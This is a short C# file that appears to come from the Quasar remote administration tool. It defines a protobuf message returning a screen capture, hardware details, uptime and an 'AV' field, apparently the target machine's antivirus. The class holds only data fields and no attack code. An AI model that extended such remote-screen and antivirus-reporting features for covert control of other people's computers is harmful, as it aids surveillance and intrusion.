using ProtoBuf;
using Quasar.Common.Messages.other;
using Quasar.Common.Video;

namespace Quasar.Common.Messages.Preview
{
    [ProtoContract]
    public class GetPreviewResponse : IMessage
    {
        [ProtoMember(1)]
        public byte[] Image { get; set; }

        [ProtoMember(2)]
        public int Quality { get; set; }

        [ProtoMember(3)]
        public int Monitor { get; set; }

        [ProtoMember(4)]
        public Resolution Resolution { get; set; }

        [ProtoMember(5)]
        public string CPU { get; set; }

        [ProtoMember(6)]
        public string GPU { get; set; }

        [ProtoMember(7)]
        public string RAM { get; set; }

        [ProtoMember(8)]
        public string Uptime { get; set; }

        [ProtoMember(9)]
        public string AV { get; set; }
    }
}
